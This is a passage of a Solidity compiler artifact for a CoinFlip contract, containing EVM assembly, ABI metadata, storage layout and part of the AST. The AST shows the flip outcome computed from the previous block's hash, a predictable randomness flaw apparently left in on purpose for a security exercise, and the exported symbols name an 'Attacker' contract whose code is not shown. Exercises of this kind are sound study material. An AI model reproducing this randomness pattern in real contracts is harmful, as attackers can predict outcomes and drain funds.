											"source": 1
										},
										{
											"begin": 1268,
											"end": 1269,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1265,
											"end": 1266,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1261,
											"end": 1270,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1256,
											"end": 1270,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1256,
											"end": 1270,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1360,
											"end": 1361,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1337,
											"end": 1362,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1337,
											"end": 1362,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1394,
											"end": 1395,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "tag",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1371,
											"end": 1396,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1371,
											"end": 1396,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1415,
											"end": 1416,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1412,
											"end": 1413,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1409,
											"end": 1417,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "tag",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1465,
											"end": 1466,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1462,
											"end": 1463,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1458,
											"end": 1467,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1467,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1467,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1556,
											"end": 1561,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1549,
											"end": 1562,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1542,
											"end": 1563,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1531,
											"end": 1563,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1531,
											"end": 1563,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1641,
											"end": 1646,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1630,
											"end": 1646,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1630,
											"end": 1646,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1738,
											"end": 1743,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "tag",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1711,
											"end": 1744,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1711,
											"end": 1744,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1766,
											"end": 1832,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1759,
											"end": 1764,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1756,
											"end": 1833,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "tag",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "tag",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1883,
											"end": 1884,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1876,
											"end": 1881,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1872,
											"end": 1885,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1865,
											"end": 1885,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1865,
											"end": 1885,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1897,
											"end": 2077,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1897,
											"end": 2077,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1945,
											"end": 2022,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1942,
											"end": 1943,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1935,
											"end": 2023,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2042,
											"end": 2046,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 2039,
											"end": 2040,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2032,
											"end": 2047,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2066,
											"end": 2070,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2063,
											"end": 2064,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2056,
											"end": 2071,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2131,
											"end": 2208,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2128,
											"end": 2129,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2121,
											"end": 2209,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2228,
											"end": 2232,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 2225,
											"end": 2226,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2218,
											"end": 2233,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2252,
											"end": 2256,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2249,
											"end": 2250,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2242,
											"end": 2257,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2269,
											"end": 2385,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 2269,
											"end": 2385,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 2354,
											"end": 2359,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 2339,
											"end": 2360,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2332,
											"end": 2337,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2329,
											"end": 2361,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "69"
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2375,
											"end": 2376,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2372,
											"end": 2373,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 2365,
											"end": 2377,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "tag",
											"source": 1,
											"value": "69"
										},
										{
											"begin": 2319,
											"end": 2321,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2309,
											"end": 2385,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2309,
											"end": 2385,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/coinflip.sol\":\"CoinFlip\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/coinflip.sol\":{\"keccak256\":\"0xbb83f3b7ead7f152bb741ba583ec5e7a2805e7600da1ed55f601dbe55025e9d5\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8042d944a9b7a124fa99aa9dcdcccf17da3476a6cf026efd737742f22481540d\",\"dweb:/ipfs/QmV5Zsu19428ySnP4bn8Cn8VAvadRf62rf1R6eTs6Q4MDb\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/coinflip.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "contracts/coinflip.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "contracts/coinflip.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/coinflip.sol": {
				"ast": {
					"absolutePath": "contracts/coinflip.sol",
					"exportedSymbols": {
						"Attacker": [
							151
						],
						"CoinFlip": [
							81
						]
					},
					"id": 152,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "85:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "85:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "122:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "122:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "145:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "145:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "162:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "262:38:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "273:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "291:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "273:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "273:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "259:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "262:0:0"
									},
									"scope": 81,
									"src": "248:52:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "357:466:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "368:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "368:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "407:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "407:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "422:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "407:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "397:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "397:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "389:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "389:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "389:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "368:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "442:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "454:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "442:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "438:63:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "466:35:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "481:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "481:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "481:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "513:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "524:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "513:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "513:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "545:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "545:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "564:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "577:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "564:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "545:38:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "594:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "594:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
